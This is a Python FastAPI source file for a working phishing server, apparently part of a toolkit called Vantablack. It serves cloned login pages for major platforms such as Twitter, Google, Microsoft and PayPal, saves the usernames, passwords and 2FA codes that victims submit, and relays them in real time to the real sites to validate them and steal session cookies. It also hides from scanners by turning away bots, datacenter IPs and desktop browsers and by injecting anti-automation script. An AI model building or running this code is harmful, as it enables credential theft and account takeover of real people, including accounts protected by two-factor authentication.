import uvicorn
from fastapi import FastAPI, Request, BackgroundTasks, HTTPException
from fastapi.responses import HTMLResponse, RedirectResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from fastapi.middleware.cors import CORSMiddleware
import logging
import json
import os
import argparse
import sys
from datetime import datetime
from core.utils.i18n import i18n, t
from core.proxy.relay import SessionRelay

# Setup logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("vantablack.phishing")

app = FastAPI()

# Mount static files if directory exists
if os.path.exists("core/assets"):
    app.mount("/assets", StaticFiles(directory="core/assets"), name="assets")

# Enable CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Capture file
CAPTURE_FILE = "captures.json"

# Global configuration
TARGET_PLATFORM = "twitter"
STEALTH_MODE = False
GEO_BLOCK = False
relay_service = None # Will be initialized in main

# Known Data Center / Bot IP Ranges (Mock prefixes for demonstration)
BLOCKED_IP_PREFIXES = [
    "35.", "34.", "104.", "52.", "54.", "13.", # Google/AWS common ranges
    "40.", "20.", "23." # Microsoft
]

BOT_AGENTS = [
    "Googlebot", "Bingbot", "Slurp", "DuckDuckBot", "Baiduspider", "YandexBot",
    "Sogou", "Exabot", "facebot", "facebookexternalhit", "ia_archiver",
    "curl", "wget", "python-requests", "scrapy", "bot", "crawler", "spider"
]

def is_bot(user_agent):
    if not user_agent:
        return True
    ua = user_agent.lower()
    for bot in BOT_AGENTS:
        if bot.lower() in ua:
            return True
    return False

def is_datacenter_ip(ip):
    # check against blocked prefixes
    for prefix in BLOCKED_IP_PREFIXES:
        if ip.startswith(prefix):
            return True
    return False

def is_mobile(user_agent):
    if not user_agent:
        return False
    ua = user_agent.lower()
    return "mobile" in ua or "android" in ua or "iphone" in ua or "ipad" in ua

def log_capture(data: dict, ip: str, user_agent: str):
    entry = {
        "timestamp": datetime.now().isoformat(),
        "ip": ip,
        "user_agent": user_agent,
        "data": data,
        "platform": TARGET_PLATFORM
    }
    
    # Append to file
    captures = []
    if os.path.exists(CAPTURE_FILE):
        try:
            with open(CAPTURE_FILE, "r") as f:
                captures = json.load(f)
        except:
            pass
    
    captures.append(entry)
    
    with open(CAPTURE_FILE, "w") as f:
        json.dump(captures, f, indent=2)
        
    print("\n" + "="*50)
    print(t("credentials_captured", ip=ip))
    print(t("platform", platform=TARGET_PLATFORM))
    print(t("data", data=json.dumps(data, indent=2)))
    print("="*50 + "\n")

@app.middleware("http")
async def stealth_middleware(request: Request, call_next):
    user_agent = request.headers.get("user-agent", "")
    client_ip = request.client.host if request.client else "127.0.0.1"
    if request.url.path in ["/health", "/status", "/ui", "/api/wan_check"]:
        return await call_next(request)
    
    # Check for known bots
    if is_bot(user_agent):
        print(t("bot_detected", ip=client_ip, agent=user_agent))
        # Redirect bots to Wikipedia
        return RedirectResponse("https://www.wikipedia.org")

    # Check IP Reputation (Datacenter/VPN)
    if GEO_BLOCK and is_datacenter_ip(client_ip):
        print(t("ip_blocked", ip=client_ip))
        return RedirectResponse("https://www.google.com")
        
    # Stealth Mode: Only allow mobile
    if STEALTH_MODE and not is_mobile(user_agent):
        print(t("stealth_mode_active"))
        # Redirect desktop users to the real site to avoid suspicion
        redirect_map = {
            "twitter": "https://twitter.com",
            "x": "https://twitter.com",
            "google": "https://google.com",
            "microsoft": "https://microsoft.com",
            "linkedin": "https://linkedin.com",
            "facebook": "https://facebook.com",
            "instagram": "https://instagram.com",
            "github": "https://github.com",
            "amazon": "https://amazon.com",
            "apple": "https://apple.com",
            "discord": "https://discord.com",
            "dropbox": "https://dropbox.com",
            "paypal": "https://paypal.com",
            "reddit": "https://reddit.com",
            "slack": "https://slack.com",
            "tiktok": "https://tiktok.com",
            "yahoo": "https://yahoo.com"
        }
        target_url = redirect_map.get(TARGET_PLATFORM, "https://google.com")
        return RedirectResponse(target_url)

    response = await call_next(request)
    return response

@app.get("/", response_class=HTMLResponse)
async def root():
    return RedirectResponse(url="/login")

@app.get("/ui", response_class=HTMLResponse)
async def ui():
    import socket
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
    except:
        local_ip = "127.0.0.1"

    html = f"""
    <html><head><title>{t('ui_title')}</title><meta name="viewport" content="width=device-width, initial-scale=1"/><style>body{{font-family:system-ui;margin:0}}header{{background:#111;color:#fff;padding:12px 16px}}main{{padding:16px}}section{{margin:16px 0;padding:12px;border:1px solid #eee;border-radius:8px}}h2{{margin:0 0 8px 0}}.grid{{display:grid;gap:12px}}@media(min-width:900px){{.grid{{grid-template-columns:1fr 1fr}}}}.status-ok{{color:green}}.status-fail{{color:red}}.info-box{{background:#eef;padding:10px;border-radius:4px;margin-top:10px}}</style></head><body>
    <header>{t('ui_title')}</header>
    <main>
      <div class="grid">
        <section><h2>{t('ui_section_status')}</h2><div id="status">Loading...</div>
            <div class="info-box">
                <strong>Local Access (LAN):</strong><br>
                <a href="http://{local_ip}:8080/login">http://{local_ip}:8080/login</a>
            </div>
        </section>
        <section><h2>{t('ui_relay_status')}</h2><div id="relay">Loading...</div></section>
        <section><h2>{t('ui_wan_status')}</h2><button onclick="checkWan()">{t('menu_verify_link')}</button><div id="wan_result"></div></section>
        <section><h2>{t('ui_section_guides')}</h2><ul><li>Installation macOS: Python 3.11+, Homebrew, venv .venv</li><li>Linux: python3-venv, pip, .venv</li><li>Windows: Python officiel, .venv</li></ul></section>
        <section><h2>{t('ui_section_compat')}</h2><ul><li>Local: /health, /login</li><li>WAN: Cloudflared</li><li>QR: quishing.py options</li></ul></section>
        <section><h2>{t('ui_section_diag')}</h2><button onclick="diag()">{t('menu_diagnostic')}</button><pre id="diag"></pre></section>
        <section><h2>{t('ui_quick_actions')}</h2>
            <button onclick="startTunnel()">{t('ui_action_tunnel')}</button>
            <button onclick="alert('Simulated QR Gen')">{t('ui_action_qr')}</button>
            <div id="tunnel_out" style="margin-top:8px;font-family:monospace;font-size:12px;"></div>
        </section>
      </div>
    </main>
    <script>
    async function refresh() {{
      try{{const r=await fetch('/status'); const j=await r.json(); document.getElementById('status').textContent=JSON.stringify(j,null,2); document.getElementById('relay').textContent = j.relay ? 'ACTIVE' : 'INACTIVE';}}catch(e){{document.getElementById('status').textContent='offline'}}
    }}
    async function diag(){{
      let out=''
      try{{const r=await fetch('/health'); out+='health '+r.status+'\\n'}}catch(e){{out+='health fail\\n'}}
      try{{const r=await fetch('/api/wan_check'); const j=await r.json(); out+='wan '+j.status+'\\n'}}catch(e){{out+='wan error\\n'}}
      document.getElementById('diag').textContent=out
    }}
    async function checkWan(){{
        document.getElementById('wan_result').textContent = "Checking...";
        try {{
            const r = await fetch('/api/wan_check');
            const j = await r.json();
            document.getElementById('wan_result').innerHTML = j.status === 'ok' ? '<b class="status-ok">ONLINE</b>' : '<b class="status-fail">OFFLINE</b>';
        }} catch(e) {{
            document.getElementById('wan_result').textContent = "Error";
        }}
    }}
    async function startTunnel() {{
        document.getElementById('tunnel_out').textContent = "To expose to WAN, please use 'Start Attack' (Option 1) in the terminal menu.";
        alert("Please use the terminal menu (Option 1) to start the WAN tunnel safely.");
    }}
    refresh();
    setInterval(refresh, 5000);
    </script></body></html>
    """
    return HTMLResponse(content=html)

@app.get("/api/wan_check")
async def wan_check(request: Request):
    import requests, socket
    debug = request.query_params.get("debug")
    dns_hosts = ["google.com", "cloudflare.com"]
    http_targets = [
        ("gstatic_204", "https://connectivitycheck.gstatic.com/generate_204"),
        ("cloudflare_trace", "https://www.cloudflare.com/cdn-cgi/trace"),
        ("neverssl_http", "http://neverssl.com/"),
        ("example_http", "http://example.com/")
    ]
    dns_results = {}
    http_results = {}
    dns_pass = False
    for host in dns_hosts:
        try:
            ip = socket.gethostbyname(host)
            dns_results[host] = {"ok": True, "ip": ip}
            dns_pass = True
        except Exception as e:
            dns_results[host] = {"ok": False, "error": str(e)}
    http_pass = False
    for name, url in http_targets:
        try:
            r = requests.get(url, timeout=1, allow_redirects=False)
            ok = r.status_code in (200, 204, 301, 302)
            http_results[name] = {"ok": ok, "status": r.status_code}
            if ok:
                http_pass = True
                if dns_pass:
                    break
        except Exception as e:
            http_results[name] = {"ok": False, "error": str(e)}
    status = "ok" if http_pass and dns_pass else "fail"
    if debug:
        return JSONResponse({"status": status, "http": http_results, "dns": dns_results})
    return {"status": status}

@app.get("/health")
async def health():
    return {"status": "ok", "target": TARGET_PLATFORM, "stealth": STEALTH_MODE, "geo": GEO_BLOCK}

@app.get("/status")
async def status():
    return {
        "target": TARGET_PLATFORM,
        "stealth": STEALTH_MODE,
        "geo": GEO_BLOCK,
        "relay": bool(relay_service)
    }

def _redirect_url():
    m = {
        "twitter": "https://twitter.com/home",
        "x": "https://twitter.com/home",
        "google": "https://accounts.google.com/",
        "microsoft": "https://login.microsoftonline.com/",
        "linkedin": "https://www.linkedin.com/",
        "facebook": "https://www.facebook.com/",
        "instagram": "https://www.instagram.com/",
        "github": "https://github.com/",
        "amazon": "https://www.amazon.com/",
        "apple": "https://www.icloud.com/",
        "discord": "https://discord.com/login",
        "dropbox": "https://www.dropbox.com/login",
        "paypal": "https://www.paypal.com/myaccount/summary",
        "reddit": "https://www.reddit.com/login/",
        "slack": "https://slack.com/signin",
        "tiktok": "https://www.tiktok.com/login",
        "yahoo": "https://login.yahoo.com/"
    }
    return m.get(TARGET_PLATFORM, "https://google.com")

@app.get("/login", response_class=HTMLResponse)
async def login_page(request: Request):
    # Determine template path
    template_path = f"core/assets/templates/high_fidelity/{TARGET_PLATFORM}.html"
    
    # Fallback for X/Twitter
    if TARGET_PLATFORM in ["twitter", "x"]:
        if os.path.exists("templates/x_login_v2.html"):
            template_path = "templates/x_login_v2.html"
            
    try:
        if os.path.exists(template_path):
            with open(template_path, "r") as f:
                content = f.read()
            if STEALTH_MODE:
                inj = "<script>(function(){try{if(navigator.webdriver)location.href='https://www.google.com';var d=/./;d.toString=function(){location.href='https://www.google.com'};console.debug(d);}catch(e){}})();</script>"
                if "</body>" in content:
                    content = content.replace("</body>", inj + "</body>")
                else:
                    content += inj
            return HTMLResponse(content=content)
        else:
            return HTMLResponse(content=f"<h1>Error: Template for {TARGET_PLATFORM} not found</h1><p>Expected at: {template_path}</p>", status_code=500)
    except Exception as e:
        return HTMLResponse(content=f"<h1>Error loading template: {e}</h1>", status_code=500)

@app.post("/login")
async def login_submit(request: Request, background_tasks: BackgroundTasks):
    try:
        data = await request.json()
    except:
        try:
            form = await request.form()
            data = dict(form)
        except:
            data = {}
    
    ip = request.client.host if request.client else "127.0.0.1"
    user_agent = request.headers.get("user-agent", "unknown")
    accept = (request.headers.get("accept") or "").lower()
    ctype = (request.headers.get("content-type") or "").lower()
    wants_json = ("application/json" in accept) or ctype.startswith("application/json")
    
    # Check if this is an OTP submission
    if "otp" in data or "code" in data or "verification_code" in data:
        print(f"🔥 [OTP] 2FA CODE CAPTURED FROM {ip}: {data}")
        log_capture(data, ip, user_agent)
        
        # Relay OTP if service is active
        if relay_service:
            otp_code = data.get("otp") or data.get("code")
            try:
                relay_service.capture_otp(otp_code)
            except:
                pass
                
        # Return success/redirect
        if wants_json:
            return JSONResponse(content={"status": "success", "redirect": _redirect_url()}, status_code=200)
        return RedirectResponse(_redirect_url(), status_code=302)

    # IMMEDIATE LOGGING (Safety First) - Write to disk synchronously BEFORE any risky operations
    try:
        log_capture(data, ip, user_agent)
    except Exception as e:
        print(f"❌ [SERVER] Log capture failed: {e}")
    
    # --- 1000% FEATURE: REAL-TIME SESSION RELAY ---
    relay_result = {"status": "skipped", "message": "No relay configured"}
    try:
        if relay_service:
            # Check if we have credentials
            # Common field names: email/username/user/login, password/pass/pwd
            username = data.get("email") or data.get("username") or data.get("user") or data.get("login")
            password = data.get("password") or data.get("pass") or data.get("pwd")
            
            if username and password:
                print(f"⚡ [RELAY] Attempting real-time validation for {username}...")
                try:
                    relay_result = relay_service.attempt_login(username, password)
                    data["relay_status"] = relay_result
                    
                    if relay_result.get("status") == "success":
                        print(f"✅ [RELAY] SUCCESS! Valid credentials for {username}")
                        # Save cookies to data
                        data["cookies"] = relay_result.get("cookies")
                        # Re-log with extra data (cookies)
                        background_tasks.add_task(log_capture, data, ip, user_agent)
                    elif relay_result.get("status") == "2fa_required":
                        print(f"⚠️ [RELAY] 2FA REQUIRED for {username}")
                        # Return 2FA requirement to client if it supports it
                        if wants_json:
                            return JSONResponse(content={"status": "2fa_required", "type": relay_result.get("2fa_type", "sms")}, status_code=200)
                    else:
                        print(f"❌ [RELAY] Login failed or unknown: {relay_result.get('message')}")
                except Exception as e:
                    print(f"❌ [RELAY] Critical Error: {e}")
                    relay_result = {"status": "error", "message": str(e)}
    except Exception as e:
        print(f"❌ [SERVER] Relay block crashed: {e}")
    
    # Force 2FA flow for JSON clients when credentials are present
    has_creds = any(k in data for k in ["password", "pass", "pwd"])
    if wants_json and has_creds:
        return JSONResponse(content={"status": "2fa_required", "type": "sms"}, status_code=200)
    
    # Redirect to real site (Legacy behavior)
    return RedirectResponse(url=_redirect_url(), status_code=302)

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="twitter", help="Target platform (e.g. twitter, google, microsoft)")
    parser.add_argument("--port", type=int, default=8080, help="Port to run server on")
    parser.add_argument("--stealth", action="store_true", help="Enable stealth mode")
    parser.add_argument("--geo", action="store_true", help="Enable Geo-Fencing (Simulated)")
    parser.add_argument("--lang", default="en", help="Language for logs")
    
    # Parse known args only to avoid conflict with uvicorn
    args, unknown = parser.parse_known_args()
    
    TARGET_PLATFORM = args.target.lower()
    STEALTH_MODE = args.stealth
    GEO_BLOCK = args.geo
    
    i18n.set_language(args.lang)

    # Initialize Relay Service (1000% Feature)
    print(t("init_relay", target=TARGET_PLATFORM))
    try:
        relay_service = SessionRelay(TARGET_PLATFORM)
        print("✅ [SYSTEM] Live Session Relay: ONLINE")
    except Exception as e:
        print(f"⚠️ [SYSTEM] Relay initialization failed: {e}")

    if GEO_BLOCK:
        print(t("geo_active"))

    print(t("starting_server", target=TARGET_PLATFORM))
    if STEALTH_MODE:
        print(t("stealth_mode_active"))
    
    uvicorn.run(app, host="0.0.0.0", port=args.port, log_level="info")
